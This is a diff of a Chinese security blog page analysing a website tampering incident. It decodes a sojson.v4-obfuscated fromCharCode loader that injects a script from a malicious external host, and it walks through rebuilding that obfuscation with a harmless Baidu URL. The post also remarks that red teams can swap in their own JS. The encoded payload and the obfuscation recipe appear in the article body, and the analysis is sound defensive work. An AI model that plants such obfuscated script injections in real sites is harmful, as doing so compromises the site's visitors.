@@ -24,27 +24,27 @@
     <meta itemprop="keywords" content="红蓝对抗,页面篡改">
     <title>页面篡改分析-基于sojson.v4混淆的页面篡思路分析 :: x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/index.xml" rel="alternate" type="application/rss+xml" title="页面篡改分析-基于sojson.v4混淆的页面篡思路分析 :: x7peeps">
-    <link href="/images/favicon.png?1779861610" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779861610" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779861610" defer></script>
-    <script src="/js/search-lunr.min.js?1779861610" defer></script>
-    <script src="/js/search.min.js?1779861610" defer></script>
+    <link href="/images/favicon.png?1779861876" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1779861876" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1779861876" defer></script>
+    <script src="/js/search-lunr.min.js?1779861876" defer></script>
+    <script src="/js/search.min.js?1779861876" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.zh.js?1779861610";
+      window.relearn.index_js_url="/searchindex.zh.js?1779861876";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779861610" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779861610" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779861610" defer></script>
-    <script src="/js/lunr/lunr.zh.min.js?1779861610" defer></script>
+    <script src="/js/lunr/lunr.min.js?1779861876" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1779861876" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1779861876" defer></script>
+    <script src="/js/lunr/lunr.zh.min.js?1779861876" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['zh'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779861610" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779861610" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779861610" rel="stylesheet">
-    <link href="/css/theme.min.css?1779861610" rel="stylesheet">
-    <link href="/css/format-html.min.css?1779861610" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1779861876" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779861876" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779861876" rel="stylesheet">
+    <link href="/css/theme.min.css?1779861876" rel="stylesheet">
+    <link href="/css/format-html.min.css?1779861876" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -93,8 +93,8 @@
       window.relearn.initVariant();
       window.relearn.markVariant();
     </script>
-    <link href="/css/custom.css?1779861610" rel="stylesheet">
-    <script src="/js/custom.js?1779861610" defer></script>
+    <link href="/css/custom.css?1779861876" rel="stylesheet">
+    <script src="/js/custom.js?1779861876" defer></script>
   </head>
   <body class="mobile-support html" data-origin="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/index.html">
     <div id="R-body" class="default-animation">
@@ -166,26 +166,26 @@
 <p>将e491q替换为sojson.v4</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>((([&#39;sojson.v4&#39;]+[])[&#34;constructor&#34;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;[&#39;split&#39;](/[a-zA-Z]{1,}/))))</code></pre></div>
 <p>放在浏览器console中直接输出结果
-<a href="#R-image-622a358b312918f9b51c2b9f56b06c84" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-622a358b312918f9b51c2b9f56b06c84"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png"></a></p>
+<a href="#R-image-78fe964f5814e26808df5d55d27817a9" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-78fe964f5814e26808df5d55d27817a9"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200813124226.png"></a></p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>document.writeln(&#34;&lt;script src=\&#39;http[:]//sf[.]backmoon[.]xyz/js/jquery.min.php\&#39;&gt;&lt;/script&gt;&#34;);</code></pre></div>
 <h2 id="分析">分析：<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="复制链接到剪贴板"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>上面的代码个人理解实际相当于下面代码</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>&#39;&#39;.constructor.fromCharCode.apply(null,&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;.split(/[a-zA-Z]{1,}/))</code></pre></div>
 <p>进一步实际关键代码，将字符数组进行混淆
-<a href="#R-image-96672c3d6f7a741ecc7ba2cd4066ec10" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="20200814161400.png-A" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-96672c3d6f7a741ecc7ba2cd4066ec10"><img class="lazy lightbox lightbox-image" loading="lazy" src="20200814161400.png-A"></a></p>
+<a href="#R-image-6bf4cacf2f547d6c92781b92c6e6e411" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="20200814161400.png-A" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-6bf4cacf2f547d6c92781b92c6e6e411"><img class="lazy lightbox lightbox-image" loading="lazy" src="20200814161400.png-A"></a></p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>&#34;100O111Z99q117F109p101j110V116Q46F119J114B105G116W101C108m110b40k34e60B115F99e114x105M112H116J32S115i114p99j61L92Q39H104c116D116R112Z58c47c47j115m102w46k98v97y99j107v109R111i111p110F46W120n121c122h47G106t115Y47r106g113P117Q101p114u121R46C109s105h110w46b112E104J112D92N39l62T60W47P115Z99Y114O105p112k116D62d34l41L59&#34;.split(/[a-zA-Z]{1,}/)</code></pre></div>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>[&#34;100&#34;, &#34;111&#34;, &#34;99&#34;, &#34;117&#34;, &#34;109&#34;, &#34;101&#34;, &#34;110&#34;, &#34;116&#34;, &#34;46&#34;, &#34;119&#34;, &#34;114&#34;, &#34;105&#34;, &#34;116&#34;, &#34;101&#34;, &#34;108&#34;, &#34;110&#34;, &#34;40&#34;, &#34;34&#34;, &#34;60&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;32&#34;, &#34;115&#34;, &#34;114&#34;, &#34;99&#34;, &#34;61&#34;, &#34;92&#34;, &#34;39&#34;, &#34;104&#34;, &#34;116&#34;, &#34;116&#34;, &#34;112&#34;, &#34;58&#34;, &#34;47&#34;, &#34;47&#34;, &#34;115&#34;, &#34;102&#34;, &#34;46&#34;, &#34;98&#34;, &#34;97&#34;, &#34;99&#34;, &#34;107&#34;, &#34;109&#34;, &#34;111&#34;, &#34;111&#34;, &#34;110&#34;, &#34;46&#34;, &#34;120&#34;, &#34;121&#34;, &#34;122&#34;, &#34;47&#34;, &#34;106&#34;, &#34;115&#34;, &#34;47&#34;, &#34;106&#34;, &#34;113&#34;, &#34;117&#34;, &#34;101&#34;, &#34;114&#34;, &#34;121&#34;, &#34;46&#34;, &#34;109&#34;, &#34;105&#34;, &#34;110&#34;, &#34;46&#34;, &#34;112&#34;, &#34;104&#34;, &#34;112&#34;, &#34;92&#34;, &#34;39&#34;, &#34;62&#34;, &#34;60&#34;, &#34;47&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;62&#34;, &#34;34&#34;, &#34;41&#34;, &#34;59&#34;]</code></pre></div>
 <p>也就是：</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>String.fromCharCode(&#34;100&#34;, &#34;111&#34;, &#34;99&#34;, &#34;117&#34;, &#34;109&#34;, &#34;101&#34;, &#34;110&#34;, &#34;116&#34;, &#34;46&#34;, &#34;119&#34;, &#34;114&#34;, &#34;105&#34;, &#34;116&#34;, &#34;101&#34;, &#34;108&#34;, &#34;110&#34;, &#34;40&#34;, &#34;34&#34;, &#34;60&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;32&#34;, &#34;115&#34;, &#34;114&#34;, &#34;99&#34;, &#34;61&#34;, &#34;92&#34;, &#34;39&#34;, &#34;104&#34;, &#34;116&#34;, &#34;116&#34;, &#34;112&#34;, &#34;58&#34;, &#34;47&#34;, &#34;47&#34;, &#34;115&#34;, &#34;102&#34;, &#34;46&#34;, &#34;98&#34;, &#34;97&#34;, &#34;99&#34;, &#34;107&#34;, &#34;109&#34;, &#34;111&#34;, &#34;111&#34;, &#34;110&#34;, &#34;46&#34;, &#34;120&#34;, &#34;121&#34;, &#34;122&#34;, &#34;47&#34;, &#34;106&#34;, &#34;115&#34;, &#34;47&#34;, &#34;106&#34;, &#34;113&#34;, &#34;117&#34;, &#34;101&#34;, &#34;114&#34;, &#34;121&#34;, &#34;46&#34;, &#34;109&#34;, &#34;105&#34;, &#34;110&#34;, &#34;46&#34;, &#34;112&#34;, &#34;104&#34;, &#34;112&#34;, &#34;92&#34;, &#34;39&#34;, &#34;62&#34;, &#34;60&#34;, &#34;47&#34;, &#34;115&#34;, &#34;99&#34;, &#34;114&#34;, &#34;105&#34;, &#34;112&#34;, &#34;116&#34;, &#34;62&#34;, &#34;34&#34;, &#34;41&#34;, &#34;59&#34;)</code></pre></div>
-<p><a href="#R-image-b37166d02a7655735e17103f21206fcd" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-b37166d02a7655735e17103f21206fcd"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png"></a></p>
+<p><a href="#R-image-ffe12f8cf85aff712f7596f7365f9334" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ffe12f8cf85aff712f7596f7365f9334"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814161526.png"></a></p>
 <h2 id="还原加密过程">还原加密过程：<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="复制链接到剪贴板"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>这里修改篡改内容为百度，实际红队利用也可以改造自己的js</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>document.writeln(&#34;&lt;script src=\&#39;http://baidu.com\&#39;&gt;&lt;/script&gt;&#34;);</code></pre></div>
-<p><a href="https://gchq.github.io/CyberChef/#recipe=To_Charcode('Comma',10)Find_/_Replace(%7B'option':'Regex','string':','%7D,'A',true,true,true,true/disabled)&input=ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCBzcmM9XCdodHRwOi8vYmFpZHUuY29tXCc%2BPC9zY3JpcHQ%2BIik7" rel="external">to charcode 10进制</a><a href="#R-image-334679447c37d3067c5d1eb9f9a01608" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-334679447c37d3067c5d1eb9f9a01608"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png"></a></p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=To_Charcode('Comma',10)Find_/_Replace(%7B'option':'Regex','string':','%7D,'A',true,true,true,true/disabled)&input=ZG9jdW1lbnQud3JpdGVsbigiPHNjcmlwdCBzcmM9XCdodHRwOi8vYmFpZHUuY29tXCc%2BPC9zY3JpcHQ%2BIik7" rel="external">to charcode 10进制</a><a href="#R-image-7092035574510e5c716a0766c10d9b28" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7092035574510e5c716a0766c10d9b28"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165203.png"></a></p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>100,111,99,117,109,101,110,116,46,119,114,105,116,101,108,110,40,34,60,115,99,114,105,112,116,32,115,114,99,61,92,39,104,116,116,112,58,47,47,98,97,105,100,117,46,99,111,109,92,39,62,60,47,115,99,114,105,112,116,62,34,41,59</code></pre></div>
 <p>替换所有&quot;,&ldquo;为随机[a-zA-Z]，这里直接全部替换A了</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59</code></pre></div>
@@ -195,8 +195,8 @@
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>&#39;&#39;.constructor.fromCharCode.apply(null,&#34;100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59&#34;.split(/[a-zA-Z]{1,}/))</code></pre></div>
 <p>通过混淆变形即生成jsonv4代码</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>((([&#39;xxx随机&#39;]+[])[&#34;constructor&#34;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&#34;100A111A99A117A109A101A110A116A46A119A114A105A116A101A108A110A40A34A60A115A99A114A105A112A116A32A115A114A99A61A92A39A104A116A116A112A58A47A47A98A97A105A100A117A46A99A111A109A92A39A62A60A47A115A99A114A105A112A116A62A34A41A59&#34;.split(/[a-zA-Z]{1,}/))))</code></pre></div>
-<p><a href="#R-image-bf67df1d3bdc579573a2c874d4495a65" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-bf67df1d3bdc579573a2c874d4495a65"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png"></a></p>
+<p><a href="#R-image-3e3c6be507d0dd611347b13c679054ff" class="lightbox-link"><img class="lazy lightbox figure-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3e3c6be507d0dd611347b13c679054ff"><img class="lazy lightbox lightbox-image" loading="lazy" src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/20200814165359.png"></a></p>
   <footer class="footline">
               <i class='fa-fw fas fa-calendar'></i> 2020年7月13日
   </footer>
@@ -413,8 +413,8 @@
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779861610" defer></script>
-    <script src="/js/theme.min.js?1779861610" defer></script><script src="/js/custom.js" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779861876" defer></script>
+    <script src="/js/theme.min.js?1779861876" defer></script><script src="/js/custom.js" defer></script>
 
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
